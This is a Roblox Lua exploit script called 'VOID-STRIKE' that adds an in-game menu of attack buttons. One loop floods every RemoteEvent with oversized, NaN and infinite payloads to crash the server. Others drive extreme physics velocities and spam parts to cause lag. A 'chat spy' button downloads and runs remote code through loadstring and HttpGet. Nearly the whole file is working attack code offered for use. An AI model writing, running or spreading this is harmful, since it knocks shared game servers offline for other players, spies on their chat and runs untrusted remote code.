--[[ 
    🔱 ARCANE VOID-STRIKE v1.0 [NUCLEAR RELEASE] 🔱
    "Because some signals are meant to be drowned. <3"
    
    FEATURES:
    - Adaptive Remote Sniffer (Universal Bypass)
    - Multi-Threaded Packet Injection
    - Physics Engine Desync
    - Replication Stress
    - Matrix Tier UI (Premium Replication)
]]

local Players = game:GetService("Players")
local RS = game:GetService("RunService")
local L = Players.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. NOTIFICATION ENGINE
local function ntf(m, c)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "VOID-STRIKE",
            Text = m,
            Icon = "rbxassetid://6034287525",
            Duration = 5
        })
    end)
end

-- 2. THE UI (NULLSTRIKE REPLICA STYLE)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "VoidStrikeUI"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 350, 0, 300)
Main.Position = UDim2.new(0.5, -175, 0.5, -150)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Main.BorderSizePixel = 2
Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
Main.BorderSizePixel = 1
Main.Active = true
Main.Draggable = true

-- Scan Grid Background (Matrix Effect)
local Grid = Instance.new("Frame", Main)
Grid.Size = UDim2.new(1, 0, 1, 0)
Grid.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Grid.BackgroundTransparency = 0.5

local TitleBar = Instance.new("Frame", Main)
TitleBar.Size = UDim2.new(1, 0, 0, 35)
TitleBar.BackgroundColor3 = Color3.fromRGB(0, 40, 0)
TitleBar.BorderSizePixel = 0

local Title = Instance.new("TextLabel", TitleBar)
Title.Size = UDim2.new(1, -10, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "🔱 VOID-STRIKE // nuclear_override"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Font = Enum.Font.Code
Title.TextSize = 14
Title.BackgroundTransparency = 1

-- Tab System
local Content = Instance.new("Frame", Main)
Content.Position = UDim2.new(0, 0, 0, 35)
Content.Size = UDim2.new(1, 0, 1, -35)
Content.BackgroundTransparency = 1

local function createAttackBtn(name, y, desc, callback)
    local btn = Instance.new("TextButton", Content)
    btn.Size = UDim2.new(0.9, 0, 0, 45)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.BorderColor3 = Color3.fromRGB(0, 100, 0)
    btn.Text = ""
    
    local tName = Instance.new("TextLabel", btn)
    tName.Size = UDim2.new(1, 0, 0.6, 0)
    tName.Text = name
    tName.TextColor3 = Color3.fromRGB(0, 255, 0)
    tName.Font = Enum.Font.GothamBold
    tName.BackgroundTransparency = 1
    tName.TextSize = 14
    
    local tDesc = Instance.new("TextLabel", btn)
    tDesc.Size = UDim2.new(1, 0, 0.4, 0)
    tDesc.Position = UDim2.new(0, 0, 0.6, 0)
    tDesc.Text = desc
    tDesc.TextColor3 = Color3.fromRGB(0, 150, 0)
    tDesc.Font = Enum.Font.Gotham
    tDesc.BackgroundTransparency = 1
    tDesc.TextSize = 10
    
    btn.MouseButton1Click:Connect(callback)
end

-- 3. THE CRASH ENGINES
local active = {
    packet = false,
    phys = false,
    inst = false
}

-- Engine 1: NUCLEAR PACKET INJECTION (Remote Sniffer)
createAttackBtn("🔥 SERVER CRASH (UNIVERSE)", 20, "Saturation totale des Remotes", function()
    active.packet = not active.packet
    ntf(active.packet and "PROTOCOLE NUCLÉAIRE ACTIVÉ..." or "EXTINCTION.", Color3.new(1,0,0))
    
    if active.packet then
        task.spawn(function()
            local payload = string.rep("🔱VOiD🔱", 1000)
            while active.packet do
                -- Intelligent Remote Discovery
                for _, v in pairs(game:GetDescendants()) do
                    if v:IsA("RemoteEvent") then
                        pcall(function() v:FireServer(payload, math.huge, 0/0, {[payload] = payload}) end)
                    end
                end
                task.wait(0.01) -- High Speed Loop
            end
        end)
    end
end)

-- Engine 2: PHYSICS DESYNC (Body Stress)
createAttackBtn("⚡ PHYSICS LAG (OP)", 75, "Force le serveur à recalculer l'impossible", function()
    active.phys = not active.phys
    ntf("Saturation physique en cours...", Color3.new(0,1,0))
    
    task.spawn(function()
        local char = L.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local bv = Instance.new("BodyVelocity", hrp)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            while active.phys do
                bv.Velocity = Vector3.new(1e38, 1e38, 1e38)
                RS.Heartbeat:Wait()
                bv.Velocity = Vector3.new(-1e38, -1e38, -1e38)
                RS.Heartbeat:Wait()
            end
            bv:Destroy()
        end
    end)
end)

-- Engine 3: REPLICATION VOID (Instance Spam)
createAttackBtn("💀 INSTANCE VOID", 130, "Explosion du Garbage Collector", function()
    active.inst = not active.inst
    ntf("Saturation des instances...", Color3.new(0,1,1))
    
    task.spawn(function()
        while active.inst do
            for i = 1, 200 do
                pcall(function()
                    local p = Instance.new("Part", workspace)
                    p.Position = Vector3.new(0, 9e9, 0) -- Hiding them
                    p.Name = "VOID_VAL"
                    game:GetService("Debris"):AddItem(p, 0.1)
                end)
            end
            task.wait(0.1)
        end
    end)
end)

-- Engine 4: CHAT SPY (Surveillance intégrée)
createAttackBtn("👁️ CHAT SPY SUPREME", 185, "Intercepte tout le signal (F9)", function()
    ntf("ESPIONNAGE ACTIVÉ. Vérifie la console (F9).")
    -- Charge le Chat Spy Supreme
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Arcane-Project/Public/main/CHAT_SPY_SUPREME.lua"))()
    end)
end)

-- 4. THE CLEANER / ANTI-DETECTION
createAttackBtn("🛑 STOP ALL", 240, "Nettoyage immédiat", function()
    for k in pairs(active) do active[k] = false end
    ntf("OPÉRATION ANNULÉE.")
end)

ntf("🔱 VOID-STRIKE ENGAGED. Que la fête commence.")
